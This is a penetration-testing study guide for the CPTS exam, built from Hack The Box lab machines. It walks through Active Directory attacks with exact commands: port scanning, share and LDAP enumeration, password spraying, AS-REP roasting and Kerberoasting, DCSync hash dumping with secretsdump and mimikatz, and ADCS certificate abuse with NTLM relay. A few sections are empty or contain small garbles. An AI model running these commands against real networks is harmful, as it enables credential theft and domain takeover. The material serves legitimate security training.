The CPTS Mindset

A guided walkthrough of every technique used across 23 HTB machines

This playbook distills every tool, technique, command, and decision point encountered across 23 Hack The Box machines that mirror the CPTS syllabus. Each technique card lists: what it does, which machines use it, prerequisite info (credentials, enumeration, access), the exact commands, and what to do next. Treat this as your single-source reference for the exam.

Methodology in one line: Enumerate → Correlate → Exploit → Dump creds → Pivot → Repeat. Never move past a host without dumping everything it offers.

CPTS Attack Methodology

Follow this loop on every host and subnet. The exam rewards depth, not speed.

The 7-Phase Loop

Applied to every machine and every internal subnet you pivot into
1Recon — Ports, services, versions, hostnames
Inputs: target IP / CIDR. Need: nothing. Next: build a service map.
# Full TCP + top UDP + scripts + version
sudo nmap -p- --min-rate 5000 -T4 -sS -sV -sC -O -oA full_tcp 10.10.11.x
sudo nmap -sU --top-ports 200 -sV -oA udp_top 10.10.11.x
# Resolve hostnames (CRITICAL for AD)
sudo nmap -n -sn 10.10.11.0/24 | tee hosts.txt
2Service-specific enumeration
Inputs: service map. Need: ports identified. Next: user lists, shares, AD objects, web paths.
# SMB / LDAP / Web / DNS in parallel
crackmapexec smb 10.10.11.0/24
ldapsearch -x -H ldap://10.10.11.x -s base '(objectclass=*)'
feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-large.txt
gobuster vhost -u http://target -w subdomains.txt
3Map the attack surface (correlate)
Build a mental graph: which users map to which services? Are there SPNs? AS-REP-roastable accounts? Writeable shares? GPOs you can edit? Next: pick the weakest link.
4Initial access / Foothold
Need: enumerated weakness (CVE, default cred, misconfig, web vuln). Next: drop a shell, escalate to a stable user.
5Credential harvesting
Always dump before escalating. Read history files, LSASS, SAM, NTDS, DPAPI, browser vaults, config files, KeePass. Next: spray creds across all services.
6Privilege escalation
Need: local shell. Check SeImpersonate, SeDebug, SeBackup, unquoted services, writable services, GPO, SCCM, ACL paths. Next: SYSTEM / DA.
7Lateral movement & pivoting
Need: valid creds / hashes / tickets. Pivot via chisel/ligolo, move via PSExec/WMI/WinRM/RDP. Next: repeat phase 1 on new subnet.

Nmap & Port Scanning

23 machines • Every engagement starts here

Always scan all 65535 TCP ports, plus top UDP. Use scripts (-sC) and version detection (-sV). For AD boxes, hostname resolution is critical — many Kerberos/SMB attacks fail without the FQDN in /etc/hosts.

Fast full TCP scan with scripts

Default starting scan on every box — Forest, Manager, Authority, Administrator, etc.
forestmanagerauthority
▸
1Run an all-ports TCP SYN scan
Inputs: target IP. Need: root (for SYN scan). Next: feed results into -sC -sV scan on open ports.
sudo nmap -p- --min-rate 5000 -T4 -Pn -n -oA allports 10.10.11.23
2Targeted deep scan on found ports
Inputs: list of open ports. Next: examine script output for hostnames, SMB signing, Kerberos realm.
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
      -sC -sV -Pn -oA deep 10.10.11.23
Why this matters: The deep scan output reveals the AD domain (e.g., FOREST.HTB LOCAL), DNS domain, SMB signing status, and LDAP base DN — all required for downstream Kerberos/LDAP attacks.
3Add hostnames to /etc/hosts
Need: hostname from nmap. Next: AD attacks now resolve correctly.
echo "10.10.10.161 forest.htb FOREST" | sudo tee -a /etc/hosts

UDP scan for forgotten services

UDP often exposes SNMP (161) which leaks AD users, processes, installed software
outdatedsnoopytrick
▸
sudo nmap -sU --top-ports 200 -sV -Pn -oA udp 10.10.11.0/24
# If 161 open, walk SNMP strings
snmpwalk -v 2c -c public 10.10.11.x | tee snmp.txt
snmp-check 10.10.11.x -c public
On Outdated, SNMP leaked running processes which disclosed MSExchange patch level → CVE-2021-42321 path. On Snoopy, SNMP revealed custom user lists.

Internal host discovery via ping sweep

Once you have a shell inside AD, enumerate the internal subnet
hospitaladministratorvintage
▸
# Linux pivot
for i in $(seq 1 254); do ping -c 1 -W 1 10.10.11.$i | grep "bytes from"; done
# Windows pivot (PowerShell)
1..254 | ForEach-Object { Test-Connection -Count 1 -Quiet 10.10.11.$_ }
# Or via nmap through a proxy (proxychains)
proxychains nmap -sn -Pn 10.10.11.0/24

SMB Enumeration

9 machines • smbclient, crackmapexec, smbmap

List and access SMB shares anonymously

Null sessions still work on many boxes — find readable shares, retrieve files
jeevesforestmanagersnoopy
▸
1List shares with null auth
Need: SMB port open. Next: enumerate each non-default share.
smbclient -L //target -N   # null session
smbmap -H target -u '' -p ''
crackmapexec smb target -u '' -p '' --shares
2Connect & recursively download
Next: inspect downloaded files for creds, configs, backups.
smbclient //target/share -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
# Or recursively download via smbmap
smbmap -H target -u 'guest' -r 'share' -R
On Jeeves, an open SMB share exposed Invoice.pdf and a KeePass DB. On Manager, share enumeration led to a backup web config with SQL creds.
3Check SMB signing status
If signing is not required, you can perform SMB relay attacks.
crackmapexec smb 10.10.11.0/24 --gen-relay-list targets.txt
nmap -p 445 --script smb-security-mode,smb2-security-mode target

LDAP / Active Directory Enumeration

14 machines • ldapsearch, windapsearch, bloodhound, PowerView

Enumerate users, groups, SPNs, ACLs via LDAP

The backbone of AD recon — pull every user, group, computer, and trust
forestauthorityvintageadministratorredelegate
▸
1Identify the domain & base DN
Need: domain name (from nmap SMB/LDAP output). Next: build full LDAP queries.
ldapsearch -x -H ldap://target -s base "(objectclass=*)"
2Dump all users with attributes
Next: identify service accounts (SPN set), disabled accounts, password-not-required accounts, descriptions with creds.
ldapsearch -x -H ldap://target -b 'DC=forest,DC=htb,DC=local' \
  '(objectCategory=person)' sAMAccountName memberOf description servicePrincipalName userAccountControl | tee users.ldif
On Forest, this revealed user s svc-alfresco with description containing notes. On Authority, LDAP disclosed the SCCM NAA account.
3Extract computers & SPNs 
ldapsearch -x -H ldap://target -b 'DC=forest,DC=htb,DC=local' \
  "(&(objectCategory=computer)(servicePrincipalName=*))" cn servicePrincipalName operatingSystem
4Find AS-REP roastable & Kerberoastable users 
GetNPUsers.py forest.htb/ -no-pass -usersfile users.txt -dc-ip target
GetUserSPNs.py forest.htb/user:pass -dc-ip target -request
5Use windapsearch for one-shot recon 
windapsearch -d target -u user -p pass --da     # domain admins
windapsearch -d target -u user -p pass --custom '(objectCategory=computer)'

BloodHound / SharpHound

12 machines • the most important tool in CPTS

If you don't have BloodHound data, you're flying blind. Run it on every AD box the moment you have any valid creds (even a guest).

Collect data with bloodhound-python

Cross-platform collector — works from Linux without .NET
forestauthorityvintageadministratortombwatcher
▸
1Run collection with any valid creds
Need: domain\user + password OR NT hash + DC IP. Next: import ZIP into BloodHound UI.
bloodhound-python -d forest.htb.local -u svc-alfresco -p 'pass' -ns 10.10.10.161 -c All
# With NT hash (pass-the-hash collection):
bloodhound-python -d domain -u user -hashes :aad3b435... -ns dc_ip -c All
2Run SharpHound from a Windows shell
Need: shell on domain-joined host as domain user. Next: exfil ZIP via SMB or HTTP.
PS> .\\SharpHound.exe -c All --zipfilename output.zip
PS> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp
3Run queries against the data
Built-in queries to run: Find All Domain Admins, Shortest Path to Domain Admins, Find AS-REP Roastable Users, Kerberoastable Users, Find Principals with DCSync Rights, Certifry Path.
4Use cypher queries for custom paths 
# Users with constrained delegation
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u
# Computers where Domain Users can RDP
MATCH p=shortestPath((u:User {name:'DOMAIN USER@DOMAIN'})-[:CanRDP*1..]->(c:Computer)) RETURN p
# Writeable GPOs
MATCH (g:GPO) WHERE g.gpcpath IS NOT NULL RETURN g

▸

Look for URL parameters (?url=, ?page=, ?file=, ?host=). Next: test internal targets.

LFI / Path Traversal

Read arbitrary files — leads to credential discovery

▸

Password Spraying

8 machines • crackmapexec, kerbrute, netexec

Spray creds across the domain

Once you have one password (or a default like 'Fall2023!'), spray it against every user
forestoutdatedauthorityadministrator
▸
1Build user list from LDAP/SMB 
crackmapexec smb target -u 'guest' -p '' --users | awk '{print $5}' > users.txt
kerbrute userenum -d domain --dc target users.txt
2Spray single password against all users
⚠ Avoid lockouts! Max 3-5 attempts per account per hour. CME has built-in lockout awareness.
crackmapexec smb target -u users.txt -p 'Fall2023!' --continue-on-success
netexec smb target -u users.txt -p 'Fall2023!' --continue-on-success
# Spray against WinRM (more valuable — gives shell)
netexec winrm target -u users.txt -p 'Fall2023!'
On Authority, a single password Welcome123! worked for many users. On Administrator, seasonal passwords like October2024! sprayed successfully.
3Interpret results
[+] = valid cred. (Pwn3d!) = local admin on that host. Next: spray that hash everywhere.

AS-REP Roasting

6 machines • GetNPUsers, impacket, Rubeus

Targets users with DONT_REQ_PREAUTH flag set. Returns an encrypted blob offline-crackable to plaintext password.

GetNPUsers.py — the workhorse

No creds needed if you have a user list, OR pass valid creds to enumerate roastable users
foreststreamioadministratortombwatcher
▸
1Attempt AS-REP roast without creds
Need: user list (from LDAP/SMB enum) + DC IP. Next: crack the hash with hashcat.
GetNPUsers.py forest.htb/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161 -format hashcat
2With valid creds — auto-discovers roastable users 
GetNPUsers.py domain.local/user:pass -dc-ip target -request
3Crack the AS-REP hash 
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
On Forest, the user svc-alfresco had DONT_REQ_PREAUTH → cracked to s3rvice. On StreamIO, admin was roastable.
4From Windows: Rubeus 
PS> .\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

Kerberoasting

9 machines • GetUserSPNs, Rubeus, hashcat 13100

Targets accounts with SPNs registered. Returns a TGS encrypted with the account's password hash. Crackable offline. High value because: works with any valid domain user, no admin needed.

GetUserSPNs.py

Best from Linux. Requires one valid domain user.
jeevessnoopyvintagevulncicadamedia
▸
1Request TGS for all SPN accounts
Need: domain\user + password + DC IP. Next: crack TGS hash offline.
GetUserSPNs.py domain.local/user:pass -dc-ip target -request -request-user 'svc_mssql'
# All SPNs at once
GetUserSPNs.py domain.local/user:pass -dc-ip target -request
2Crack TGS with hashcat 
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
On Jeeves, the Jeeves account had an SPN and was crackable. On Snoopy, svc_ipa had a weak password that fell to rockyou.
3From Windows: Rubeus 
PS> .\\Rubeus.exe kerberoast /outfile:tgs.txt /nowrap
PS> .\\Rubeus.exe kerberoast /user:svc_mssql /outfile:tgs.txt
4AES vs RC4
RC4-HLM (mode 13100) is fast to crack. AES-256 (mode 19700) is much harder. Try to force RC4: set /rc4opsec off in Rubeus.

DCSync

8 machines • secretsdump.py, mimikatz, lsadump

Replicates AD secrets from the DC by impersonating a DC. Requires DS-Replication-Get-Changes right (granted to Domain Admins, Enterprise Admins, and any account with Replicating Changes ACL).

secretsdump.py — pull every hash in the domain

End-game move. Once you have DCSync rights, the domain is fully compromised.
forestadministratorauthorityvintagetombwatcher
▸
1Run secretsdump with valid DA creds
Need: domain admin (or DCSync-permitted account) creds. Next: extract krbtgt,Administrator hashes and pass-the-hash to DC.
secretsdump.py domain.local/admin:pass@dc_ip -just-dc-ntlm
# With NT hash (PTH to DCSync)
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:<nt_hash> domain.local/admin@dc_ip
# Dump krbtgt only (for golden ticket)
secretsdump.py domain.local/admin:pass@dc_ip -just-dc-user krbtgt
2On Windows — Mimikatz 
mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
On Forest, the path was AS-REP roast → user with DCSync rights → secretsdump → Administrator hash → PTH to DC.

ADCS / ESC1-15

7 machines • certipy, certi, evil-winrm

Active Directory Certificate Services is one of the most common CPTS escalation paths. ESC1-8 are the most-tested.

Enumerate vulnerable templates

Use certipy to scan all templates for misconfigurations
vintageghostwhiterabbitadministratortombwatcher
▸
1Find vulnerable CAs & templates
Need: any domain user creds. Next: identify ESC1-15 vulnerability type.
certipy find -u user@domain.local -p 'pass' -dc-ip dc_ip -vulnerable -stdout
certipy find -u user@domain.local -p 'pass' -dc-ip dc_ip -old-bloodhound
2ESC1 — SAN-allowed, low-priv enrollment
Template allows client specify subjectAltName + enrollable by low-priv users + ENROLLEE_SUPPLIES_SUBJECT flag.
certipy req -u user@domain.local -p 'pass' -ca 'CA-NAME' -template 'TEMPLATE' -upn Administrator@domain.local
# Use the cert to auth as Administrator
certipy auth -pfx administrator.pfx -dc-ip dc_ip
On Vintage, ESC1 with SAN=Administrator yielded a PFX → TGT → DCSync. On Ghost, ESC4 allowed modifying a template to enable ESC1.
3ESC4 — modify template to ESC1 
certipy template -u user@domain.local -p 'pass' -template TEMPLATE -save-old
certipy req -u user@domain.local -p 'pass' -ca 'CA' -template TEMPLATE -upn Administrator@domain.local
4ESC8 — NTLM relay to web enrollment 
python3 PetitPotam.py attacker_ip dc_ip
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'

Common Pitfalls

▸
✗ Forgetting to add hostname to /etc/hosts → Kerberos fails
✗ Skipping UDP scan → miss SNMP (goldmine on Outdated/Snoopy)
✗ Running BloodHound only once — re-run after each escalation
✗ Locking out accounts via aggressive password spraying
✗ Forgetting to crack ALL hashes with rules
✗ Not pivoting deep enough — exam rewards full compromise of all subnets
✗ Not documenting while you go — exam requires detailed report
